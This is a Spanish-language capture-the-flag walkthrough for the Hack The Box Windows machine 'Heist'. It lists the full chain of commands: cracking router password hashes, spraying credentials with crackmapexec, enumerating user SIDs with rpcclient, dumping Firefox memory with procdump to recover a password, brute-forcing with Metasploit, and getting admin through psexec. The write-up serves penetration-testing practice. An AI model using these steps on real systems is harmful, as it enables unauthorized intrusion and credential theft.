## HTB-Heist
- Maquina: **Windows**
- Level: **Easy**
- IP: **10.10.10.149**

## Herramientas a utilizar:
- nmap
- jhon = John the Ripper
-   https://packetlife.net/toolbox/type7/
-   https://github.com/Hackplayers/evil-winrm
-   https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
- crackmapexec
- smbmap
- sysinternals
- metaexploit
- psexec.p

```
nmap -sC -sV -o scan_heist.txt 10.10.10.149
```
Encontraremos los siguiente puertos abierto.

|PORT|STATE|SERVICE|VERSION|
|---|---|---|---|
|80/tcp|open| http|Microsoft IIS httpd 10.0
|135/tcp|open|msrpc| Microsoft Windows RPC
|445/tcp|open|microsoft-ds?|

Primero iniciaremos a enumerar por el puerto 80
```
http://10.10.10.149/
```
Aqui tenemos un login, pero si nos fijamos bien, tenemos un acceso de invitado, podemos llegar a
```
http://10.10.10.149/attachments/config.txt
```
Este archivo contiene la configuracion de un router en el cual veremos varios users y password.

|1| secret 5 |$1$pdQG$o8nrSzsGXeaduXrjlvKc91
|----|----|----|
|2| username rout3r password 7 |0242114B0E143F015F5D1E161713 
|3| username admin privilege 15 password 7 |02375012182C1A1D751618034F36415408

Con el primero intentaremos Crakear el password creamos un archivo `hashespass.txt` y en el colocamos: `enable_secret:$1$pdQG$o8nrSzsGXeaduXrjlvKc91` Ahora utilizamos **John the Ripper** y el Direccionario **rockyou.txt**
```
john --wordlist=/usr/share/wordlists/rockyou.txt hashespass.txt
```
Nuestro resultado sera: **stealth1agent**    (enable_secret)

Con los demas iremos al siguiente Web: https://packetlife.net/toolbox/type7/
El resultado sera:

|user| password|
|---|---|
|rout3r| $uperP@ssword
|admin |Q4)sJu\Y8qz*A3?d

Colocamos todos los usuario en **user.txt** y los password en **pass.txt**

Utilizaremos `crackmapexec` con los archivos **user.txt** y **pass.txt**
```
crackmapexec smb 10.10.10.149 -u user.txt -p pass.txt
```

De los resultado de crackmapexec tenemos que:
SUPPORTDESK [+] **SupportDesk\hazard:stealth1agent**


Ahora utilizaremos **smbmap** para ver que tipo de privilegios tenemos con **hazard**
```
smbmap -H 10.10.10.149 -u hazard -p stealth1agent
[+] Finding open SMB ports....
[+] User SMB session establishd on 10.10.10.149...
[+] IP: 10.10.10.149:445	Name: heist.htb
	Disk                                      	Permissions
	----                                      	-----------
	ADMIN$                                    	NO ACCESS
	C$                                        	NO ACCESS
	IPC$                                      	READ ONLY
```

Notamos que solo tenemos acceso **read only** remote **IPC$**
```
rpcclient -U 'hazard%stealth1agent' 10.10.10.149
rpcclient $> lookupnames hazard
```
Nuestro output sera: 
hazard S-1-5-21-4254423774-1266059056-3197185112-1008 (User: 1)
```
rpcclient $> lookupsids S-1-5-21-4254423774-1266059056-3197185112-1008
```
Ahora tenemos el siguiente output
S-1-5-21-4254423774-1266059056-3197185112-1008 SUPPORTDESK\Hazard (1)

Con el SID intentaremos listar los usuarios.
```
rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c 'lookupsids S-1-5-21-4254423774-1266059056-3197185112-1000'
```
Si todo va bien tenemos una output: S-1-5-21-4254423774-1266059056-3197185112-1000 *unknown*\*unknown* (8)

Por lo que ahora haremos una funcion para ver todo los posible SID y removiendo los unknown.
```
for i in {1000..1050}; do rpcclient -U 'hazard%stealth1agent' 10.10.10.149 -c "lookupsids S-1-5-21-4254423774-1266059056-3197185112-$i" | grep -v unknown; done
```

Con esto veremos 2 usuarios **Chase** y **Jason** los agregaremos a `user.txt`
Utilizaremos `crackmapexec` otra vez con los archivos **user.txt** y **pass.txt**
```
crackmapexec smb 10.10.10.149 -u user.txt -p pass.txt
```
Y veremos que el usuario **Chase:`Q4)sJu\Y8qz*A3?d`**

Utilizaremos **Evil-WinRM**, pero en mi caso particular lo utilice de la siguiente manera
con `gem install winrm winrm-fs colorize stringio`
```
ruby evil-winrm/evil-winrm.rb -i 10.10.10.149 -u SUPPORTDESK\\chase -p 'Q4)sJu\Y8qz*A3?d'
```

Ahora tenemos acceso a heist con el usuario **chase**
Enumeracion y encontramos que en 
```
C:\inetpub\wwwroot> 
```
Existe dos archivos `error.php` y `login.php` 
```
En login.php vemos:
hash: 91c077fb5bcdd1eacf7268c945bc1d1ce2faf9634cba615337adbf0af4db9040
user: admin@support.htb
```
Colocamos el hash en `hash_admin.txt` y utilizamos John otra vez
```
john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash_admin.txt
```
y Esto no funciono 🤷‍♂️

Aqui solo puedo decir que despues de Mucho buscar en internet he intentar y intentar

Volvi Heist con la session de Chase y me puse a buscar en los procesos

C:\Program Files> 
Ejecutamos **Get-Process**

Vi que Firefox se estaba ejecutando.

|408|31|17404|63308|2.17|2768|1| firefox|
|--|--|--|--|--|--|--|--|
|390 | 32|    43244|      75072|      57.30|   **4728**|   1| firefox
|358 |     27|    16364|      37608|       0.58|   6808|   1| firefox
|1151|      70|   132720|     204480|      28.55|   6924|   1| firefox
|343 |     20|     9976|      37300|       0.33|   7052|   1| firefox
    
Por lo que descargue `systeminternal` desde https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite
```
unzip sysinternals-suite
```
Volvemos acceder a heist con el usuario chase y subimos el `procdump64.exe`
```
upload procdump64.exe
.\procdump64.exe -accepteula
.\procdump64.exe -ma 4728 <4728 es el id_proc firefox que encontramos>.
```
Esto genera un archivo **firefox.exe_`fechayhora`.dmp** el cual deberemos descargar.
En nuestro caso fue:
```
download firefox.exe_2102209_003234.dmp
```
Mientras se esta descargado con otra shell vamos hacer la siguiente busqueda.
```
strings firefox.exe_210209_003234.dmp |grep admin@support.htb
```

y con esto veremos password del admin@support.htb el es XXXXXXXXX
actualizamos los archivo user: con admin@support.htb y el pass con XXXXXXXXX
volvemos a probar con crackmapexec
```
crackmapexec smb 10.10.10.149 -u user -p pass
```

Si por alguna razon no tienes el resultado utilizando el proceso de Firefox, puede utilizar el siguiente mentodo.
```
msfconsole
use auxiliary/scanner/winrm/winrm_login
set pass_file /home/r0ok1e/Downloads/htb/machine/heist/pass.txt
set user_file /home/r0ok1e/Downloads/htb/machine/heist/user.txt
set rhost 10.10.10.149
run
```
Y aqui veremos que funciona user/pass chase y el del administrator

Para poder acceder con esta nuevas credenciales utilizaremos `PSEXEC`.
```
locate psexec.p
python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.149
```

Listo, solo es ir a Desktop del administrator y tenemos root.txt y nuestra flag
